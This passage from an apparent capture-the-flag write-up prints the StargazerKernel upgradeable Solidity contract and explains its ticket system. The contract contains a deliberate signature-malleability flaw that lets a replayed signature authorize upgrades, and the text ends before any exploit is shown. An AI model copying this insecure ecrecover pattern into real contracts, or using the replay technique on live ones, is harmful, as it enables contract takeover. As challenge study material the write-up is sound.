‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£≠‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£π‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£§‚†§‚¢§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚†¥‚†í‚¢ã‚£â‚£Ä‚£†‚£Ñ‚£Ä‚£à‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∏‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£¥‚£æ‚£Ø‚†¥‚†ö‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚£§‚†è‚£ø‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°ø‚°á‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£¥‚°ø‚†ø‚¢õ‚†Å‚†Å‚£∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£§‚£æ‚†µ‚†ö‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚¢¶‚°Ä‚†Ä‚£†‚†Ä‚°á‚¢ß‚†Ä‚†Ä‚¢Ä‚£†‚°æ‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£¥‚†ø‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£ø‚†Ä‚£Ä‚°†‚†û‚†õ‚†Å‚†Ç‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°à‚£ª‚°¶‚£û‚°ø‚£∑‚†∏‚£Ñ‚£°‚¢æ‚°ø‚†Å‚†Ä‚†Ä‚†Ä‚£Ä‚£¥‚†ü‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†ê‚††‚°§‚£æ‚£ô‚£∂‚°∂‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ç‚°∑‚†∞‚£î‚£æ‚£ñ‚£æ‚°∑‚¢ø‚£ê‚£Ä‚£Ä‚£§‚¢æ‚£ã‚†Å‚†Ä‚†Ä‚†Ä‚£Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚†Ä‚¢Ä‚¢ø‚†ë‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚††‚°¶‚†¥‚†¥‚†§‚†¶‚†§‚†§‚†§‚†§‚†§‚†¥‚†∂‚¢æ‚£Ω‚£ô‚†í‚¢∫‚£ø‚£ø‚£ø‚£ø‚¢æ‚†∂‚£ß‚°º‚¢è‚†ë‚†ö‚†ã‚†â‚†â‚°â‚°â‚†â‚†â‚†π‚†à‚†Å‚†â‚†Ä‚†®‚¢æ‚°Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ç‚†Ä‚†Ä‚†Ä‚†Ç‚†ê‚†Ä‚†Ä‚†Ä‚†à‚£á‚°ø‚¢Ø‚¢ª‚£ü‚£á‚£∑‚£û‚°õ‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£†‚£Ü‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚°∑‚°õ‚£õ‚£º‚£ø‚†ü‚†ô‚£ß‚†Ö‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£æ‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£¥‚¢∂‚†è‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ø‚¢†‚£¥‚°ü‚°ó‚°æ‚°í‚†ñ‚†â‚†è‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚¢Ä‚£†‚£ß‚£Ä‚£Ä‚†Ä‚†Ä‚†Ä‚†ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚¢¥‚£ø‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£∑‚¢ø‚†ã‚†Å‚£ø‚°è‚†Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ô‚£ø‚¢≠‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°¥‚¢è‚°µ‚†õ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£¥‚†û‚†õ‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚†Ä‚†Ç‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ç‚¢ø‚†ò‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚£Ä‚£º‚†õ‚£≤‚°è‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚°æ‚†ã‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢æ‚°Ö‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚°¥‚†ü‚†Ä‚¢∞‚°Ø‚†Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚¢¥‚†ü‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£π‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚°æ‚†Å‚†Å‚†Ä‚†ò‚†ß‚†§‚¢§‚£§‚†∂‚†è‚†ô‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢æ‚°É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†ò‚£á‚†Ç‚¢Ä‚£Ä‚£Ä‚†§‚†û‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†à‚†â‚†â‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†æ‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢º‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†õ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä *************************************************************************** ...wondering if it will get the chance to witness it again. **************************************************************************/ The Stargazer contract implements the ERC1967 standard from the OpenZeppelin upgradable contracts collection.\nThe ERC-1967 standard defines a consistent pattern for upgradable contracts by using two contracts with different purposes. The only functionality of the first contract, known as the proxy contract, is to hold the contract storage. The proxy storage holds the address where the logic of the contract is implemented, known as the implementation contract. The proxy contract receives function calls and proxies them to the logic contract using delegatecall. The use of the delegatecall instruction is the key because it allows the implementation contract to execute code using the proxy storage. The ability to just point to another address for the implementation in the proxy contract, make this pattern \u0026ldquo;upgradable\u0026rdquo;.\nThe standard is being used by the UUPS (Universal Upgradeable Proxy Standard) and the Transparent Upgradeable Proxy Pattern. As we\u0026rsquo;ll see later, that challenge is based on the UUPS pattern.\nIn the end, the Stargazer contract is just an OpenZeppelin implementation of ERC-1967, with a cool ascii art.\nStargazerKernel.sol # // SPDX-License-Identifier: MIT pragma solidity ^0.8.20; import \u0026#34;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\u0026#34;; contract StargazerKernel is UUPSUpgradeable { // keccak256(abi.encode(uint256(keccak256(\u0026#34;htb.storage.Stargazer\u0026#34;)) - 1)) \u0026amp; ~bytes32(uint256(0xff)); bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800; /// @custom:storage-location erc7201:htb.storage.Stargazer struct StargazerMemories { uint256 originTimestamp; mapping(bytes32 =\u0026gt; uint256[]) starSightings; mapping(bytes32 =\u0026gt; bool) usedPASKATickets; mapping(address =\u0026gt; KernelMaintainer) kernelMaintainers; } struct KernelMaintainer { address account; PASKATicket[] PASKATickets; uint256 PASKATicketsNonce; } struct PASKATicket { bytes32 hashedRequest; bytes signature; } event PASKATicketCreated(PASKATicket ticket); event StarSightingRecorded(string starName, uint256 sightingTimestamp); event AuthorizedKernelUpgrade(address newImplementation); function initialize(string[] memory _pastStarSightings) public initializer onlyProxy { StargazerMemories storage $ = _getStargazerMemory(); $.originTimestamp = block.timestamp; $.kernelMaintainers[tx.origin].account = tx.origin; for (uint256 i = 0; i \u0026lt; _pastStarSightings.length; i++) { bytes32 starId = keccak256(abi.encodePacked(_pastStarSightings[i])); $.starSightings[starId].push(block.timestamp); } } function createPASKATicket(bytes memory _signature) public onlyProxy { StargazerMemories storage $ = _getStargazerMemory(); uint256 nonce = $.kernelMaintainers[tx.origin].PASKATicketsNonce; bytes32 hashedRequest = _prefixed( keccak256(abi.encodePacked(\u0026#34;PASKA: Privileged Authorized StargazerKernel Action\u0026#34;, nonce)) ); PASKATicket memory newTicket = PASKATicket(hashedRequest, _signature); _verifyPASKATicket(newTicket); $.kernelMaintainers[tx.origin].PASKATickets.push(newTicket); $.kernelMaintainers[tx.origin].PASKATicketsNonce++; emit PASKATicketCreated(newTicket); } function commitStarSighting(string memory _starName) public onlyProxy { address author = tx.origin; PASKATicket memory starSightingCommitRequest = _consumePASKATicket(author); StargazerMemories storage $ = _getStargazerMemory(); bytes32 starId = keccak256(abi.encodePacked(_starName)); uint256 sightingTimestamp = block.timestamp; $.starSightings[starId].push(sightingTimestamp); emit StarSightingRecorded(_starName, sightingTimestamp); } function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) { StargazerMemories storage $ = _getStargazerMemory(); bytes32 starId = keccak256(abi.encodePacked(_starName)); return $.starSightings[starId]; } function _getStargazerMemory() private view onlyProxy returns (StargazerMemories storage $) { assembly { $.slot := __STARGAZER_MEMORIES_LOCATION } } function _getKernelMaintainerInfo(address _kernelMaintainer) internal view onlyProxy returns (KernelMaintainer memory) { StargazerMemories storage $ = _getStargazerMemory(); return $.kernelMaintainers[_kernelMaintainer]; } function _authorizeUpgrade(address _newImplementation) internal override onlyProxy { address issuer = tx.origin; PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer); emit AuthorizedKernelUpgrade(_newImplementation); } function _consumePASKATicket(address _kernelMaintainer) internal onlyProxy returns (PASKATicket memory) { StargazerMemories storage $ = _getStargazerMemory(); KernelMaintainer storage maintainer = $.kernelMaintainers[_kernelMaintainer]; PASKATicket[] storage activePASKATickets = maintainer.PASKATickets; require(activePASKATickets.length \u0026gt; 0, \u0026#34;StargazerKernel: no active PASKA tickets.\u0026#34;); PASKATicket memory ticket = activePASKATickets[activePASKATickets.length - 1]; bytes32 ticketId = keccak256(abi.encode(ticket)); $.usedPASKATickets[ticketId] = true; activePASKATickets.pop(); return ticket; } function _verifyPASKATicket(PASKATicket memory _ticket) internal view onlyProxy { StargazerMemories storage $ = _getStargazerMemory(); address signer = _recoverSigner(_ticket.hashedRequest, _ticket.signature); require(_isKernelMaintainer(signer), \u0026#34;StargazerKernel: signer is not a StargazerKernel maintainer.\u0026#34;); bytes32 ticketId = keccak256(abi.encode(_ticket)); require(!$.usedPASKATickets[ticketId], \u0026#34;StargazerKernel: PASKA ticket already used.\u0026#34;); } function _recoverSigner(bytes32 _message, bytes memory _signature) internal view onlyProxy returns (address) { require(_signature.length == 65, \u0026#34;StargazerKernel: invalid signature length.\u0026#34;); bytes32 r; bytes32 s; uint8 v; assembly (\u0026#34;memory-safe\u0026#34;) { r := mload(add(_signature, 0x20)) s := mload(add(_signature, 0x40)) v := byte(0, mload(add(_signature, 0x60))) } require(v == 27 || v == 28, \u0026#34;StargazerKernel: invalid signature version\u0026#34;); address signer = ecrecover(_message, v, r, s); require(signer != address(0), \u0026#34;StargazerKernel: invalid signature.\u0026#34;); return signer; } function _isKernelMaintainer(address _account) internal view onlyProxy returns (bool) { StargazerMemories storage $ = _getStargazerMemory(); return $.kernelMaintainers[_account].account == _account; } function _prefixed(bytes32 hash) internal pure returns (bytes32) { return keccak256(abi.encodePacked(\u0026#34;\\x19Ethereum Signed Message:\\n32\u0026#34;, hash)); } } The logic implementation of the contract provides a wide set of functionalities, so we need to start analyzing them. First of all, the contract inherit from OpenZeppelin V5 UUPSUpgradeable implementation. That means the contract will expose implicitly some functions and modifiers.\nFor example, the onlyProxy() modifier, that ensures (where applied) that functions calls are proxied, and not directly sent to the implementation contract.\nIt also expose an important overridable function: _authorizeUpgrade. That function must be overridden and implemented in the contract, and it\u0026rsquo;s the key function that authorizes upgrades. In our case, to pass an upgrade request, the only requirement is that the call is proxied and that _consumePASKATicket internal function should not revert.\nfunction _authorizeUpgrade(address _newImplementation) internal override onlyProxy { address issuer = tx.origin; PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer); emit AuthorizedKernelUpgrade(_newImplementation); } Another important function exposed implicitly in StargazerKernel is upgradeToAndCall which is the function that needs to be called to initiate a contract upgrade, common in many different OZ proxy pattern implementations.\nIn fact, reading the documentation and code of OpenZeppelin implementations is a must to fully understand the functionality of the smart contract. Furthermore, a fundamental requirement is to understand the basic mechanisms of an UUPS pattern, which have already been partly explained but can be explored in more detail from this recent excellent blog post by RareSkills.\nFinally, one last standard that is helpful to read is ERC-7201. This implementation of UUPS in fact make use of the concept of \u0026ldquo;Namespaced Storage Layout\u0026rdquo; to overcome some known problems of proxy patterns, such as storage collision. ERC-7201 solves these problems, initializing all the state variables of the contract inside a struct that is saved to a storage pointer defined by the following formula:\nkeccak256(abi.encode(uint256(keccak256(\u0026#34;htb.storage.Stargazer\u0026#34;)) - 1)) \u0026amp; ~bytes32(uint256(0xff)) The meaning of this formula, and the reason for this choice and how it is useful for the implementations of upgradable contracts can be explored in depth in this other excellent blog post by RareSkills again.\nAfter the initial ERC-hell we can dive into the core logic implemented in StargazerKernel:\ninitialize(string[] memory _pastStarSightings): This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed behind a proxy. Since proxied contracts do not make use of a constructor, it‚Äôs common to move constructor logic to an external initializer function, usually called initialize. It then becomes necessary to protect this initializer function so it can only be called once. The initializer modifier provided by this contract will have this effect. This camouflaged constructor plays a very important role for these patterns. In fact, leaving the contract uninitialized opens up a huge security risk. However, this is not our case as the contract is initialized as soon as it gets created. In particular, our initialization function takes as input the string array _pastStarSightings to reconstruct the past memory of our \u0026ldquo;Stargazer\u0026rdquo;.\n_getStargazerMemory(): Every function that intends to access contract storage must comply with ERC-7201, which is why a utility function to quickly retrieve the correct storage pointer of the main storage is necessary. The intended storage pointer is the pre-calculated __STARGAZER_MEMORIES_LOCATION constant, which effectively points to the Stargazer \u0026ldquo;memories\u0026rdquo;.\ncreatePASKATicket(bytes memory _signature): This is one of the crucial functionalities of the whole implementation. This function enables a KernelMaintainer to generate a new PASKATicket (Privileged Authorized StargazerKernel Action Ticket), which authorizes them to perform privileged actions such as upgrading the contract. A signature needs to be passed to it. The signature mechanism is presented as a 2FA-like structure, where only if a valid signature from an already registered KernelMaintainer is provided, then it will issue a valid PASKATicket. The signature mechanism uses per-user nonces and construct the message hash using personal_sign standart to avoid known eth_sign issues, like signature replay from a sent transaction. The signature validation is guaranteed by _verifyPASKATicket internal function. If that function does not revert, then a valid signature has been passed and a PASKATicket will be issued under an PASKATickets[] array inside the KernelMaintainer struct, and the maintainer nonce will be updated. NOTE: while the per-user nonce model makes sense in both security and convenience sides, it plays a crucial role in making the exploitation possible. We will see why later.\n_verifyPASKATicket(PASKATicket memory _ticket): This internal view function validates the authenticity and uniqueness of a provided PASKATicket. The validation process calls _recoverSigner internal function that uses the widely known ecrecover pre-compile to extract the signer address from the provided signature. This function is widely known to have security concerns due to its low-level nature. In order to be used safely, some input and output validation needs to be done. The Solidity documentation hints to one of the major issues (see image below), i.e. signature malleability, however it doesn\u0026rsquo;t provide further details. Details on how an unsafe ecrecover can open to security vulnerability can be read online, e.g. this blog post. The invalid signature length, zero address signer, eth_sign replay, signature deduplication, can be cancelled out in the possible exploits scenarios because checks are being made for these. One plausible concern can be made around Signature Malleability, since the recover function doesn\u0026rsquo;t enforce the lower half ECDSA curve order for the s parameter. The issue is confirmed by how the signature \u0026ldquo;bin\u0026rdquo; for used signature is implemented. As stated here if used signatures are tracked by reliying only on the signature bytes, then another valid, but different, signature of the same action by the same address can be used to bypass the mechanism and open to Signature Replay Attack. We will dive into that later.\n_consumePASKATicket(address _kernelMaintainer): An internal function responsible for validating and consuming a PASKATicket associated with a KernelMaintainer. It accesses the maintainer\u0026rsquo;s active PASKATickets and ensures that at least one ticket exists. If yes, the ticket is popped from the list of available tickets and gets trashed inside the usedPASKATickets array.\ncommitStarSighting(string memory _starName): This function records a new sighting of a specified star, updating the starSightings mapping, which is of our interest. Since it consumes a PASKATicket, in order to commit a new star sighting, the function call must be initiated from a registered 